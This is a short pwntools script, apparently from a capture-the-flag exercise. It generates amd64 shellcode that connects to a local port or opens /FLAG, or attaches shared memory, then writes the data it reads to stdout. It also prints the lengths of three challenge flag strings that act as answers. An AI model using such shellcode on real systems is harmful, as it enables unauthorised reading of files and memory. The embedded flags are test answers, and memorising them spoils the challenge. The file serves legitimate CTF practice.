#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
from capstone import *

# print(shellcraft.amd64.mov('rax', 0xffffffff).rstrip())
# print(shellcraft.amd64.open('/FLAG',"O_RDONLY").rstrip())
# print(shellcraft.amd64.read('rax','rsp',100).rstrip())
# print(shellcraft.amd64.write(1,'rsp',100).rstrip())

# print(shellcraft.amd64.shmget(0x1337,0,512).rstrip())
# print(shellcraft.amd64.shmat('rax',0,4096).rstrip())
# print(shellcraft.amd64.write(1,'rax',100).rstrip())

print(shellcraft.amd64.connect("127.0.0.1", 0x1337,network='ipv4').rstrip())
print(shellcraft.amd64.read('rax','rsp',100).rstrip())
print(shellcraft.amd64.write(1,'rsp',100).rstrip())

print(len("FLAG{r0p_fr0m_r@nd0m_bYt3s_/FLAG_1c8d22d5b1e9757912361c3ab179fcab}"))
print(len("FLAG{sh@red_M3M_@ccess_in_@ss3mb1Y_c6a9cda2915bf9a0f1da3f6af4971731}"))
print(len("FLAG{n3tw0rk_5Y5c@ll_in_@ss3mb1Y_abc3913883153e70e53e116480c97a2b}"))